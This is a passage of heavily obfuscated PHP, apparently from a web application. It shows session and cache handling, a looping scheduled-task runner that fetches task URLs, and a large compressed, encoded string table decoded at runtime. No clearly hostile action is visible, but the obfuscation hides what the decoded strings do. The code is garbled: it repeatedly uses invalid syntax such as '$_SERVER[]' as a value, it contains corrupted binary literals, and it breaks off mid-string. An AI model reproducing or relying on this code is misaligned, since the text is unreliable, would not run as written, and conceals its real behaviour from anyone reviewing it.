$d[$Aߗ]; $C = $d[$B[798]]; switch ($Aߗ) { case $B[17]: self::$handle = Model($B[799]); break; case $B[800]: self::$handle = new CacheRedis($AЬ׺ߑ, $C); break; case $B[801]: self::$handle = new CacheMemcached($AЬ׺ߑ, $C); break; case $B[193]: $AЬ׺ߑ[$B[76]] = $AЬ׺ߑ[$B[76]] . $B[1495]; self::$handle = new CacheFile($AЬ׺ߑ, $C); default: break; } goto F; d̹: $d = $GLOBALS[$B[6]][$B[347]]; self::$sessionTime = $d[$B[1492]]; $c؈ = isset($GLOBALS[$B[1493]]) ? $GLOBALS[$B[1493]] : SESSION_ID; goto eƦ; eƦ: if (self::$sessionSign) { } else { if (Cookie::get($c؈)) { self::$sessionSign = Cookie::get($c؈); } else { self::$sessionSign = guid(); } } Cookie::setSafe($c؈, self::$sessionSign, self::$sessionTime); $Aߗ = $d[$B[1494]]; goto F; F: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $c搙 = new self(); return $c搙; goto d窭; E: $B =& $_SERVER[]; static $c搙 = false; if ($c搙) { return $c搙; } goto d̹; d窭: } public static function sign($cʩ˓ = false) { $cʩ˓ && (self::$sessionSign = $cʩ˓); self::init(); return self::$sessionSign; } public static function set($c, $Aǆ = false) { self::init(); if (is_array($c)) { foreach ($c as $f܎ => $E뎙) { array_set_value(self::$data, $f܎, $E뎙); } } else { array_set_value(self::$data, $c, $Aǆ); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($fևˈ = false) { self::init(); if (!$fևˈ) { return self::$data; } return array_get_value(self::$data, $fևˈ); } public static function remove($aı) { self::init(); unset(self::$data[$aı]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[][803])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { goto Fб; bȭ: http_close(); self::valueSet($A[1496], $A[87]); Hook::bind($A[1498], $A[1499]); goto E؆; E؆: while (!0) { self::cacheClear(); if (self::valueGet($A[715]) != $A[87]) { self::valueSet($A[1496], $A[191]); self::log($A[1500]); die; } self::valueSet($A[1496], $A[87]); self::valueSet($A[1497], time()); self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } goto Bל҆; Fб: $A =& $_SERVER[]; if (self::valueGet($A[715]) != $A[87]) { return; } if (self::valueGet($A[1496]) == $A[87]) { $F = self::valueGet($A[1497]); if (time() - $F > self::AUTO_RESTART_TIME) { self::restart(); } return; } goto bȭ; Bל҆: } public static function restart() { $a̎ =& $_SERVER[]; http_close(); self::valueSet($a̎[715], $a̎[191]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet($a̎[1496], $a̎[191]); self::valueSet($a̎[715], $a̎[87]); } public static function shutdownEvent() { $Fմ =& $_SERVER[]; self::valueSet($Fմ[1496], $Fմ[191]); self::log($Fմ[1501]); } public static function config($Dȣ, $Eѻ) { self::valueSet($_SERVER[][715], $Dȣ); } private static function taskRunAll() { goto c޶; D: self::taskQueueRun($bó󻳚); goto bޅ; c޶: $C긒 =& $_SERVER[]; $bó󻳚 = timeFloat(); $e硯 = Model($C긒[1502])->listData(); goto c; c: $aԐ = count($e硯); for ($aҌ = 0; $aҌ < $aԐ; $aҌ++) { $BΦ엢 = $e硯[$aҌ]; if (!$BΦ엢[$C긒[393]] || $BΦ엢[$C긒[1503]] != $C긒[87]) { continue; } if (!self::taskTimeCheck($BΦ엢)) { continue; } self::taskRun($BΦ엢); } Hook::trigger($C긒[1504]); goto D; bޅ: } private static function taskQueueRun($dم) { $Aڑ = 10; while (!0) { $a˧ = TaskQueue::run(); if ($a˧ === !1) { break; } if (timeFloat() - $dم >= $Aڑ) { break; } } } private static function taskTimeCheck($fǔ) { goto eƳ; eṤ: $D볔 = strtotime($F[1505] . $FͰ[$F[1506]] . $F[1507]) - strtotime($F[1508]); $dԭ = time() - strtotime(date($F[1509]) . $F[1510]); $f܃ = $dԭ >= $D볔 && $dԭ <= $D볔 + 3600; goto dو; dو: switch ($FͰ[$F[29]]) { case $F[1511]: if (time() - $Cڿ < 3600 * 24 * 30) { return !1; } if ($FͰ[$F[1511]] == date($F[1512]) && $f܃) { return !0; } break; case $F[1513]: if (time() - $Cڿ < 3600 * 24 * 7) { return !1; } $d = date($F[1514]) == 0 ? 7 : date($F[1514]); if ($FͰ[$F[1513]] == $d && $f܃) { return !0; } break; case $F[1506]: if (time() - $Cڿ < 3600 * 24) { return !1; } if ($f܃) { return !0; } break; case $F[1515]: if (time() - $Cڿ >= floatval($FͰ[$F[1515]]) * 60) { return !0; } break; default: break; } return !1; goto Aڪ; eƳ: $F =& $_SERVER[]; $FͰ = json_decode($fǔ[$F[197]], !0); $Cڿ = intval($fǔ[$F[1497]]); goto eṤ; Aڪ: } private static function closeDatabase() { goto a; a: $D =& $_SERVER[]; static $f妊 = 0; $Fݻ󍭖 = 300; goto Dۋ; f习ϸ: $B̋ = Model($D[494])->db($D[33]); if ($B̋) { $B̋->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { write_log($D[1516], $D[1517]); die; } goto F; Dۋ: if (!$f妊) { $f妊 = time(); } if (time() - $f妊 < $Fݻ󍭖) { return; } $f妊 = time(); goto f习ϸ; F: } public static function taskRun($F苚) { goto cá; Aƾ޲: $eՋ = timeFloat(); $FŃÚÆ = $bŖ[33]; switch ($F苚[$bŖ[29]]) { case $bŖ[305]: $c򹟑 = url_request($F苚[$bŖ[1521]], $bŖ[228], !1, !1, !1, !1, 10); if ($c򹟑[$bŖ[715]]) { $FŃÚÆ = strlen($c򹟑[$bŖ[1091]]); } break; case $bŖ[227]: $FŃÚÆ = Hook::apply($F苚[$bŖ[1521]]); default: break; } goto c׭; c׭: Model($bŖ[1522])->add(array($bŖ[1523] => $bŖ[33], $bŖ[1524] => $bŖ[191], $bŖ[29] => $bŖ[1525] . $F苚[$bŖ[393]], $bŖ[1526] => json_encode(array($bŖ[28] => $F苚[$bŖ[28]], $bŖ[1527] => timeFloat() - $eՋ, $bŖ[291] => $FŃÚÆ)))); $e = $FŃÚÆ ? $bŖ[1528] . $FŃÚÆ : $bŖ[33]; self::log($bŖ[1529] . $F苚[$bŖ[393]] . $bŖ[517] . $e); goto c⭵۴; cá: $bŖ =& $_SERVER[]; self::log($bŖ[1518] . $F苚[$bŖ[393]] . $bŖ[1519] . $F苚[$bŖ[28]] . $bŖ[1520] . $F苚[$bŖ[1521]]); Model($bŖ[1502])->run($F苚[$bŖ[393]]); goto Aƾ޲; c⭵۴: return !0; goto Dս; Dս: } private static function valueGet($d١苦) { $b =& $_SERVER[]; $Dˈ = $b[1530]; $fߗȑ = Model($b[486])->get($d١苦, $Dˈ); if (is_null($fߗȑ)) { Model($b[486])->set($b[715], $b[87], $Dˈ); Model($b[486])->set($b[1496], $b[191], $Dˈ); $fߗȑ = Model($b[486])->get($d١苦, $Dˈ); } return $fߗȑ; } private static function valueSet($d, $Aތ) { $c먨 =& $_SERVER[]; $C氷 = $c먨[1531]; CacheLock::lock($C氷); $aۤ = Model($c먨[486])->set($d, $Aތ, $c먨[1530]); CacheLock::unlock($C氷); return $aۤ; } protected static function log($eϔ) { write_log($eϔ, $_SERVER[][1517]); } private static function cacheClear() { $fӾ֏ =& $_SERVER[]; Cache::clearMemory(Model($fӾ֏[486])->cacheKey($fӾ֏[1530])); Cache::clearMemory(Model($fӾ֏[486])->cacheKey($fӾ֏[1532])); Model($fӾ֏[1502])->cacheClear(); self::closeDatabase(); } } goto Fϡ; A߿: if (!function_exists('_kodDe')) { function _kodDe($f򉆂) { $f򉆂 = base64_decode($f򉆂); $a = strlen($f򉆂); $eȿ = ''; $dՐ = ord($f򉆂[0]) - 30; for ($aޖ = 1; $aޖ < $a; $aޖ += 2) { if ($aޖ + 1 < $a) { $eȿ .= chr(ord($f򉆂[$aޖ + 1]) + $dՐ); $eȿ .= chr(ord($f򉆂[$aޖ]) + $dՐ); } else { $eȿ .= chr(ord($f򉆂[$aޖ]) + $dՐ); } } return $eȿ; } } define("\xc8\xdb\xd5", "\215\372\271\332\321\250"); $_SERVER[] = explode(strrev('|||'), gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\255\175\11\174\123\125\366\260\273\240\242\316\250\270\215\343\263\202\155\151\226\226\262\26\12\246\155\332\6\322\246\44\51\5\32\14".base64_decode('L8lr89okL7z30jYFdBRFkcV9GZdRYZhxR3B3xB1HB3Abl7+7oywyKG6j4zLCdw==').base64_decode('93vfS+r8v9/38QPy7rn7veeee86555776OIDFx+y+MAr993y489/2Lv5RRxE/w==')."\16\305\277\247\257\30\166\0\372\163\360\212\113\313\312\232\47\34\121\321\172\324\145\17\334\43\337\41\337\55\257\12\370\267\154\365\215\170\351\356\31\336\235\153\267\344".base64_decode('dx54wLqPll1fAxLjvDX4R8popqQMqIZpYEBcy3Sp3fhbzeBfN/4xFqZUU8Hf0Q==')."\xd6\x40\x38\x1a\x6a\x6f\x6b\xf3\x6\xc3\x51\x52\xa2\x18\x9f\xd6\x12\xe4\x2b\x2b\xeb\x72\x9a\x14\x9e\x55\x74\x3\x54\x25\x16\x17\xcd\x6a\x59\x25\x63\x81\x70\x40\x42\x36\xe5\x98\x6c\x90"."\222\32\352\242\15\336\66\177\140\156\64\74\267\315\113\122\304\242\13\163\212\236\307\41\364\31\62\145\335\14\253\151\205\245\350\327\131\273\352\274\115\276\126\51\34\364"."\xb4\x86\x3c\xf5\x61\x5f\xa0\x15\x83\xeb\x3\x2d\x2d\xbe\x70\x21\x3c\x18\xf0\xfb\xeb\x3c\xf5\x33\xb\x63\xda\x82\x9e\xa6\x16\x8f\x4\xda\x97\x52\xa2\x6a\xa6\x4b\x2b\x93\x16\xe0\x98\x5"."\122\71\376\150\124\225\124\2\177\146\144\332\34\63\237\45\137\141\366\5\346\40\223\113\245\160\240\225\175\221\366\53\135\162\56\105\306\254\101\14\144\165\65\55\323\256"."\xcf\x54\xf2\xc\x8a\x3f\xe4\x9c\xa9\xa9\x99\x38\xe\x78\x7\x4c\x5d\xe6\x70\xd0\xe2\xb8\xae\xa4\x95\xc\x29\x2a\xe4\xf5\x7b\xeb\xc3\x12\x6c\xa6\xd4\x18\xc\xb4\x48\x64\x2a\xd2\xb2\x61".strrev('ĮnA'."\n".'E<ť%Li~y"ok	RR%z'."\r".'Ժ*').strrev('BZ	KAfHƁGS0AM'."\n".'iJZӥ)')."\224\31\355\223\123\71\212\254\275\370\267\224\374\220\137\315\40\10\274\120\315\250\71\202\254\244\10\115\143\53\207\174\344\150\152\205\102\224\4\371\110\203\374\32\131\134".base64_decode('YKX14c/aafh3CkkUi8I4RTejSiauJdQMWY/TydojGCibyQZdBelIgZorrmXzLQ==')."\x5a\x1f\xe9\x4c\x97\x9a\x52\xfc\x6c\xb9\x75\x69\xa9\x84\xa2\xf3\x70\x16\x64\x17\x63\x48\xaf\xd4\x41\x21\x77\x6b\x2e\x2d\x26\x61\xc1\x78\x52\x4d\x25\x74\xba\x4a\x7f\x29\x25\xa0\x3\x6a"."\x57\x9e\xaf\x46\x43\xcb\xe9\x71\xc5\x7\xd6\xb\xcf\xdb\xc6\x5a\x52\x45\x12\x29\xa6\x9\x3a\x6d\xd0\x7e\xb5\x67\x53\x9a\x9c\x8\x29\xba\xd0\xd7\x46\x90\x31\x90\x33\x45\x60\xe\x25\x6b"."\xd4\xf4\x74\x3\xa0\x1b\xa4\x7e\xb0\x5a\xd4\xf6\x22\x11\xbd\x74\xbd\x24\x84\x21\x74\x11\x7a\x57\xd6\x79\xbe\x73\xdf\xfc\xce\xb3\xc1\x7f\xe5\x84\xf8\x45\x48\xd3\x92\x4a\x2a\x15\x55\x6"."\x14\xb2\xae\xd2\x89\xf1\x6\xed\xab\xdb\x88\xa9\x19\x37\x80\xe0\xa0\x2f\x10\x4d\xca\x46\xb2\x25\x31\x3e\x8a\x72\x51\x9a\x9a\x50\x6\x5c\xd9\x64\x96\x2c\x7d\xb6\xda\x23\x16\xbc\x87\xb3".strrev('1F\\-HJCQ$(,?#)'."\r".'{2^').base64_decode('aMZ0in3R3jGYwYDmAMGYEhJWBkwyKNKUeFLWwXTV5swu5yRCX7LZlBqXTVXLuA==')."\xb5\xb8\xa9\x98\x4e\xc3\xd4\x15\x99\x94\xe6\x89\xc7\x15\xc3\x70\xd6\x6b\x19\x53\xd7\x52\x4e\x4f\x2a\xa5\xf5\x3b\x3\xba\xda\xad\x66\x6a\xa4\x31\x84\x1a\x83\x48\xb0\xde\x9d\x90\x42\xd6".strrev('M6IT3VF5I0|zwE.g.,]\\	E2\\E')."\71\236\204\304\205\27\137\373\13\351\325\114\112\315\50\5\151\275\3\131\125\127\14\332\126\251\251\45\114\12\1\245\53\316\66\135\356\116\313\65\122\66\27\3\43\103"."\126\157\21\30\116\115\206\246\106\212\303\240\103\112\347\14\323\251\53\200\112\251\140\77\44\163\354\353\162\266\300\245\245\52\11\147\10\20\163\2\256\256\34\47\1\264"."\x91\x68\x1c\x86\x36\x87\xc3\x6d\x51\x5f\x23\xd8\xb3\x5b\xbd\xd1\x16\x4f\xb8\xbe\x99\x34\xdb\x94\xbb\x69\x9b\xfd\x80\x44\xb3\x22\x29\x70\x8e\x13\x2c\x31\x88\x58\xad\xa0\xaf\x1c\xd8\xa6".strrev('+}TX7LtwNq0Q6j#_.:+')."\x6e\x33\x49\x33\x86\xbc\xc1\xd9\xde\x60\x34\x14\x68\xc\x77\x78\x82\x64\xb7\xcf\x0\x2c\x19\xa0\x55\xc1\xa2\x53\xce\xa0\x92\x0\x43\x1f\x37\x69\x3e\x39\xb\x47\x8d\xa6\x81\xb\x3\xce".base64_decode('FY2Fi4XG+X1NcGAanAZI5BRT0bL9alqFbTdZDBpJwAo0kQa5UYdqI8kxZZFERQ==')."\271\23\374\77\246\274\63\322\340\32\63\177\272\133\345\171\334\125\256\52\151\154\345\4\251\15\360\46\252\234\222\110\247\13\122\124\112\201\231\277\60\0\160\353\22\226"."\xb5\x6d\xe8\x30\x30\xe8\x9d\xd5\xee\xd\x85\xa3\x2d\xde\x70\x73\xa0\x81\xd4\xe0\xf5\x90\x2f\xbf\x86\x97\x26\xed\x51\x27\xfe\x99\xef\xe2\xf4\x18\xcc\xb9\x2f\x2d\x77\xdb\xa8\x34\xc\xb5"."\150\272\142\205\360\135\243\103\115\120\62\16\203\315\212\332\235\44\375\123\141\151\161\55\245\351\162\12\122\61\212\304\12\245\54\335\152\27\231\37\114\60\171\40\244\246"."\263\224\256\231\311\134\72\46\174\122\266\24\314\67\335\136\222\32\333\336\64\235\174\325\270\111\302\321\143\33\51\145\166\207\252\301\137\116\206\23\132\132\246\334\56\42".base64_decode('SUoC0yQMGmOJaVZkvl+auqlBqG5J0qKYSY1MUrdCm5RjbaOtTCgphY5GUqEkvQ==')."\222\44\3\73\23\33\253\56\106\336\1\343\6\240\174\113\125\215\40\310\11\31\51\32\356\200\374\56\7\230\54\151\12\354\46\201\130\17\130\56\204\223\120\215\106\141"."\xf3\x8f\x6a\x28\xe\x34\x5e\xe6\xe9\xdb\x74\xa5\x4b\x25\x8b\x2e\x3\x66\xac\x45\xd6\x7b\x69\x6\x30\x43\x7c\xdb\x81\x1\xa1\xb0\xc6\x76\xbf\x3f\x5a\x1f\x68\xd\x3\x1e\x1a\x43\x3a\x82"."\xbe\xb0\x97\xe2\xa8\xa7\x21\xea\xa9\x6f\x63\x9b\x28\x9f\x71\x92\x0\x12\x8c\xc2\xdd\x0\x43\xfa\xc6\xa\x3b\x11\xdf\xb2\x38\x31\xa7\x5b\x2d\x24\xd6\xf8\x1b\x50\xe7\xac\x96\x31\x14\x67".base64_decode('nJSW4GQdp5hio+kFOTjnPuCU04PONBgmJ2u6dYeVwuJG7SPzysk3HFggGNGtvQ==')."\x2d\x10\x22\x19\xa6\x43\x28\xe0\x9e\x62\x8a\x4e\xda\xd1\xd6\x4e\xa2\xd2\x2\x4e\x35\x79\x9\xf0\x8\xba\x5b\xcb\x84\x77\xf2\x74\x84\x28\xe9\xcd\x81\xf4\xba\x3a\x28\xf3\x3e\x4e\xa7\xed"."\41\145\17\244\123\234\41\264\366\312\311\347\42\334\354\153\235\31\155\11\64\170\375\121\137\53\240\113\341\102\170\173\133\203\207\116\256\10\257\13\204\233\55\320\166\100"."\x99\x66\x7b\xfc\x3e\x7b\x72\xef\x1c\x5f\x28\x1c\x2a\x1a\x5\x60\xed\x5e\x5b\xc\x90\x5\xdb\x82\xde\x46\xdf\x1c\x16\x6c\xf4\x79\xfd\xd\xa1\x68\xbd\xa7\xbe\x99\xa7\x69\xf5\xb4\x90\x40"."\264\13\112\143\206\333\232\76\12\110\154\210\311\164\321\76\50\237\322\301\212\132\4\250\50\25\15\242\34\17\300\166\251\20\334\43\335\205\122\61\352\11\341\321\343\132"."\216\142\43\143\23\323\224\252\244\145\262\254\144\272\25\226\341\237\162\311\23\222\314\154\224\321\217\130\236\175\242\156\320\60\140\10\111\375\22\41\367\5\55\210\302\64"."\165\112\27\243\334\305\1\236\56\223\121\1\133\30\254\13\36\7\146\300\203\304\157\200\11\150\106\242\164\255\31\100\136\361\320\346\164\161\321\67\32\150\363\6\75\120"."\160\216\166\4\3\255\115\44\103\177\122\241\15\360\221\341\57\243\354\23\221\237\115\116\302\0\357\43\123\21\212\17\172\217\106\207\162\61\376\71\13\377\0\266\217\124"."\256\144\350\250\307\40\65\147\204\201\174\164\201\325\100\51\261\226\143\265\305\64\55\105\327\51\340\0\30\75\140\222\167\217\101\221\144\200\22\237\12\272\245\221\35\45"."\34\230\351\155\215\122\314\302\41\1\33\61\0\310\262\201\40\31\20\123\353\245\2\25\216\14\172\103\164\225\353\312\302\234\112\207\313\355\252\40\130\254\200\115\213\124".base64_decode('7z4n0l9R1umscM0HH+VjzsZBEoq4LMFRJH9OZ7khY1RmTC+vibgj7rLpNZ0e5w==')."\xa0\xec\x1c\xac\x74\x4e\x76\xce\xaf\x88\xb8\xca\x2b\x8\x60\xfe\xa2\xb1\x8e\x71\x4b\x60\x2\x90\x70\xfa\x99\xf3\xc1\x4f\x6d\x64\xfa\xe8\x88\xf3\xac\x73\x17\x9c\xdd\x19\x99\x5f\x5a\x53"."\x71\x46\xc4\x75\x66\xa4\x7f\xfe\x98\xf2\xe9\xb4\x9e\x78\x4e\x7\xc2\x62\x3c\xcf\x9a\x9a\xa8\x28\x3\x4d\x2\xc\x13\x4b\x92\x41\x24\x4f\x48\x40\x23\x6\xd5\x2c\x87\x2e\x9a\xb0\x84\xc2"."\xc1\x1c\x2a\xdd\x3c\x47\xa7\x33\x52\x31\x7f\xba\x90\x4f\x0\xd9\xeb\x2\xcc\x12\xa0\xbf\x49\x96\xce\xe3\x9c\x7\x7b\xc6\xb2\xc2\x75\x4f\xf0\x23\x97\x89\x73\xea\x9\xd7\x45\x4c\x8e\x13"."\72\240\166\147\330\22\2\134\0\23\322\255\174\372\242\321\370\167\11\235\310\156\145\200\222\206\114\227\252\23\354\314\145\324\205\124\7\221\121\26\222\17\315\244\370\35"."\123\314\176\205\242\7\200\133\302\0\71\250\140\10\242\204\120\12\261\205\244\6\56\240\51\110\132\41\275\310\106\41\117\326\317\102\11\45\103\346\151\70\111\155\304\345".base64_decode('rBISehiNhj11fm+UUhhCiWkYUcU6prUDXeMUldKHOGfSkTxCVr6xMCUhwiApug==')."\256\351\65\110\73\151\344\262\220\231\3\262\227\11\306\126\2\202\273\124\73\115\302\103\116\362\105\305\11\310\312\224\163\200\262\264\300\15\100\12\105\332\224\345\63\144"."\x0\x16\x8c\xf2\x43\xee\xb2\x48\x24\xd7\xa9\x24\xe6\x77\x2\xc4\x97\x9d\x5d\xf3\x17\x55\x2f\x29\xa7\x7c\xbc\x3b\x2\xfe\xd0\x80\xa7\x88\x12\x2d\xca\xa8\x61\x14\xec\xcf\x2e\xd8\xe\xa6".base64_decode('B7EEWDQOajpjmrIWttvUTDllKSIMIZQ00Y2bqAzwbPs5xYJbuaCDROS0lSnYmA==')."\2\104\120\177\301\34\41\305\164\261\24\16\41\22\377\137\133\102\51\174\6\254\241\172\141\177\303\112\233\120\336\60\225\264\105\117\151\50\262\36\117\66\346\122\51\223"."\x71\xfc\x29\xb5\x97\x14\x4b\x16\xc8\x82\x62\x69\x1b\x35\x9d\x4a\xb6\x63\x48\xbd\x25\x63\x8a\x25\xf4\x65\x32\x40\xe\x15\x11\x8a\x6f\xa5\x4d\x1e\xc0\xb4\x84\xa5\x32\xaa\xd3\x93\x7c\xad".base64_decode('Ul0g4Pd6WiW4a5PdxtfgpPnnOH0N+Jt9qAk6CYCSmRRKtFkkBJlHB1TcOCCL4A==').strrev('3P0.TDѪ|6Cuô\\ 9WvI@r'."\0".'')."\222\363\16\334\46\277\322\247\244\34\264\105\16\332\120\7\145\361\35\110\144\153\40\255\151\7\213\201\264\6\175\2\232\227\164\300\351\207\330\347\340\132\72\122\235\40"."\123\70\270\274\341\350\326\265\134\266\215\326\44\204\160\143\10\200\267\224\1\202\232\146\72\250\14\351\50\24\57\213\17\131\361\246\243\61\266\327\115\346\7\106\25\16".base64_decode('SfHSC8fcKh0twgURKXsJ3YcsafgU0lWSUngIDjL/ms2XFuxHo9wnIlUxBKO7AQ==')."\105\106\256\55\347\312\134\316\235\332\345\104\273\52\26\126\32\226\273\103\102\165\246\334\115\353\52\22\213\277\203\112\74\37\347\262\146\203\40\301\132\103\154\334\321\272"."\x28\x86\xdc\xc5\xe7\x93\x21\x2c\x9b\x87\x23\x86\xf\xa7\x3\x49\xb1\x98\xcd\xa5\x5\xf9\x87\x5c\x6d\xbc\x4f\x81\x2c\xdf\xd0\x21\x9\xd\x81\xad\x45\x20\x92\x14\x14\xe0\x34\x39\x47\x18"."\x10\xd9\x20\xa2\x0\xd4\xaf\x92\x2f\x85\xc2\x78\x57\xc4\xc1\x46\xfd\xb1\x3\xe8\xe8\x58\xea\x85\x41\x8e\x28\x74\x8\x24\x58\x81\x43\xd8\x32\xe1\x2a\x71\xf2\x29\x17\x82\xe4\x47\xd5\xa2".base64_decode('eNyjaSbFs4mwEXQ4L21qJq9mRC0Lh/I9gW9JEHFteqGGob4xLeRaHAfR7jiAWA==')."\336\53\354\34\134\205\0\132\17\263\12\155\47\45\331\132\116\11\6\351\164\73\220\111\243\66\304\45\50\233\224\165\76\246\164\205\101\64\347\272\53\230\204\7\205\144".base64_decode('XXIf3y4teYR1Yph52nrx01ooDjYMFWhmonaxoLgEVcMPxq7YN+ppWCsahAog+g==')."\xad\x21\xfc\xa7\xe7\xb1\x96\xdd\xc\x9\xab\x65\x14\x46\xb6\xc5\xa8\x20\xc2\xb2\x95\x69\xcd\x87\x1b\xe8\x61\xc4\xd\xf0\x97\x29\x40\xc9\x75\x17\x5c\x4c\x4d\x90\x30\x8b\xc4\x91\x11\x33".strrev('syJ.t\'!I\\'."\n".'ᤊHlK4n')."\x20\x45\xb4\xb0\x51\x70\x39\x14\xf\x37\xea\x1a\xe3\xdb\xd8\x6\x68\x4f\x54\x8f\x4\x23\x53\x9c\xc\x61\xf7\x12\x86\xce\xb2\xd1\x16\x80\x84\x3c\xf6\x2d\xd7\x6\xb5\x5\xf9\xc\x58\x88"."\x35\x6\x51\xb5\xa9\x9c\x48\xab\x19\x97\x8e\xc9\xbe\xb\xb0\xbb\xe4\x0\xd4\x51\x29\xf0\x22\x9c\x76\x2d\x32\xd0\x64\x92\x6d\x62\x89\xd\x25\x4c\x20\x5a\xc7\x64\xdd\xa5\x83\x9a\x79\x83"."\10\7\233\143\323\60\237\264\12\25\305\323\11\344\23\305\370\65\52\215\101\212\340\115\250\46\204\100\202\257\121\135\53\117\50\34\102\62\230\110\217\341\0\270\12\46".base64_decode('gTOqjtGWlMU2O9cYtD+5+HYsbubiOSs8qcVfgnFCmh3dIqDLMLUsjxGCOFqI4g==').strrev(''."\n".' ('."\0".'U;]'."\r".'|'."\n".'W,'."\r".'"KJ& O6ة'."\n".'')."\xd1\x75\x50\x6c\x1b\xc2\x85\x7b\xfb\xb8\xd1\x1\x2e\xa\x56\xec\xc2\xab\xd2\x25\x27\x12\x1\xaa\xb2\x15\xbf\xb\x93\x8a\x1a\xac\xe2\x5\x21\x3b\x10\x56\x94\x10\x2a\x9e\xdc\x93\x4a\xf1".base64_decode('02F7eMgseAGKmUTIkNkakfREj3GKwRjjLbKXVnaSn9Xb2U4rpR2aNxmC8PAJLQ==')."\36\6\373\170\175\122\315\50\6\333\216\165\243\110\217\41\146\16\65\115\60\116\320\61\2\61\32\0\304\235\216\51\322\70\121\20\66\163\264\61\106\115\13\33\22\104"."\145\10\250\152\31\175\260\64\360\110\102\302\354\13\0\324\57\216\17\366\164\12\125\45\42\12\63\240\26\353\50\230\77\310\303\14\125\46\215\146\105\161\206\147\327\313".base64_decode('ezZc+tDru6/CwZUvvXbD82SSerSE0UuOxcC/gwqNvi6ak9c+ef6Ewy/9bhFo+A==')."\47\215\363\174\257\277\155\256\170\241\46\225\127\266\324\174\366\176\352\206\321\313\266\267\255\151\320\313\364\244\157\357\276\373\223\67\246\366\65\137\261\246\374\225\343\235"."\357\334\172\350\274\133\133\46\234\275\364\220\226\127\264\320\372\233\265\127\317\330\265\355\362\7\76\61\345\273\273\76\210\174\361\375\246\25\3\237\277\375\334\123\227\75"."\xb9\xff\xfb\x45\x97\x9d\x77\xf9\xae\xe9\xaf\x3f\xfc\x9b\x69\x63\xef\xb9\xa8\xd3\x91\xcc\x85\xef\x6e\x9f\xa4\xf4\x1c\x37\xe2\xed\x33\x1f\x3f\x6a\xe1\xd9\xdf\x9c\x32\x61\xf9\x31\x17\xdf".base64_decode('sXzX5nmP3nvdlvbW4bcHlrfM/p9dxvb82ld2xF8++s+zuxzXfb+/6Y4RRkljzQ==').base64_decode('xvT4o+5bf8Ntdxnv/PaMI1/83hxzzpbKt16/w/veyCkjVrzwx9ja1rrrDrr4jA==').base64_decode('0U98dOa2ewf2D7z+7w31Zdf++p2Trr2gLR6a9M+fkmsPe2jdJ+Oefnrf8aUnXg==')."\321\366\365\202\311\345\325\53\153\236\375\344\245\201\65\277\275\154\360\246\354\137\365\21\217\277\264\250\372\213\325\213\73\236\330\174\330\23\115\7\265\255\273\354\317\167"."\x2e\xbd\x7d\x5a\x68\xdd\xdd\xfd\x1f\x8c\xd9\x7e\x4a\x59\xff\x9b\x5b\x6b\xff\xb3\xfb\xb4\x6f\x3f\x4f\x3f\x72\xf0\xb9\x75\xfa\x63\xaf\x2e\x1c\xde\x31\xc2\xbb\x74\xca\x51\xef\xa6\xae\xbf"."\x21\xf6\xe9\xbc\xa5\xa1\xa3\x52\xf3\x5c\x95\xfd\x95\xc9\x6f\x9e\x1e\x38\xe8\xce\xf4\xe8\xa5\x1f\x7c\x74\xf9\x65\xfd\x3f\x2d\xbd\xb9\x2b\xda\x72\xd5\xd8\xc7\x72\x3b\xf7\x6e\xbc\x3d\x39"."\x6f\xdd\x6b\x7\xdc\x77\xd2\x84\xc9\xf7\x5c\xbf\x6e\x70\xdd\xec\x8a\x83\xbb\x9f\x78\xf4\xd5\x8a\xdb\xe7\xc5\x6e\xbd\xa0\x62\x42\xf7\xbc\x7\x6f\xbd\x35\xe6\x2b\x3f\x60\xfd\xb5\xcb\x57"."\x6c\x7d\x65\xdd\xd8\xe0\x1\x15\x7b\x5f\x7b\xed\xbe\x35\xd7\x1f\xea\xfd\xd5\x77\xb9\xee\x19\x6f\x38\xae\xbd\xf4\xe3\x7b\x86\x9d\xfd\x43\xe8\xc8\xf5\x5f\x3f\xb7\x22\xfb\xab\xc4\x7d\x63"."\xa3\x37\xbd\xfd\xd8\x4b\x73\xfe\xbe\xf5\x5f\xe7\xde\x58\x39\x75\x75\xfd\xfc\xbf\x1e\x58\xf6\xee\x86\x17\xe6\x6e\x68\x9b\xb0\x62\xd5\x5\x6d\xf3\x8f\x7a\x67\xea\xfe\xdd\x9d\x7\x7e\x3e".strrev(',WY?7o-r<+3ɻ;X[\'X2>')."\75\374\44\363\361\341\145\175\207\125\355\371\350\232\223\16\370\315\163\63\57\176\341\351\335\371\123\17\377\250\302\365\174\143\357\262\157\275\63\327\264\34\263\370\233\27"."\272\57\177\363\37\107\37\163\350\323\227\176\377\174\331\3\362\212\245\357\267\35\162\310\141\217\377\366\361\307\142\307\176\363\312\361\377\136\376\257\260\47\346\166\225\175".base64_decode('9VrV2j93/8l5m3fa+2uPbv7rsVuPP7wne7kSmPCHL0ue3fDei0cduftPWy96/A==')."\x57\x67\x8c\xfb\xd5\xf5\x3f\x9e\x74\xcc\xd4\xdd\x57\x55\x6f\xff\x64\xf8\xe4\xa7\x5a\x6e\xdc\x7c\xdb\xf0\xce\x99\xa7\xdd\x74\xab\xea\x1f\x19\xfc\xfb\xdb\x7f\x50\x4e\xfa\xf8\xf6\x15\x1d"."\177\335\372\331\374\330\251\317\374\356\354\236\301\163\56\370\364\352\317\16\133\363\310\314\305\73\227\124\226\126\274\165\326\13\3\311\274\363\335\147\366\346\364\17\165\207".base64_decode('59tXHxhR8VZ56otc7J/jJn4zbM+p77euuOWsh1MrG164/ooT6s/a27m3ZObkyg==')."\61\345\333\274\173\312\117\360\335\220\150\12\256\76\240\372\253\275\253\77\171\165\333\303\363\357\77\165\364\252\273\316\156\331\272\105\365\257\335\376\317\377\234\175\120\245"."\x74\